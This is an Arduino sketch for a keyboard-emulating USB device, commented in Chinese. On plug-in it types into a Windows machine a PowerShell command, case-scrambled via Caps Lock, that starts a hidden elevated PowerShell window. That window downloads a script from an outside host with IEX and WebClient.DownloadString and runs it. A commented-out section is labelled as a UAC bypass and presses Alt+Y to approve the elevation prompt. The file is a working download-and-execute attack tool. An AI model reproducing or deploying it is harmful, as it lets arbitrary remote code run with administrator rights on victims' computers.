void setup(){
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("POWERSHELL -NOP");
  Keyboard.println();
  delay(1000);
  Keyboard.println("START-PROCESS -fILEpATH POWERSHELL \" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;IEX(nEW-OBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADsTRING(`'HTTP://PAN.PLYZ.NET/D.ASP?U=1235108351&P=GET.PS1`');EXIT\" -vERB RUNAS;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
  //bypass uac 绕过UAC,这一段不会用的不要用,否则后果自负
  //Keyboard.press(KEY_LEFT_ALT);
  //Keyboard.print('y');
  //Keyboard.release(KEY_LEFT_ALT);
}
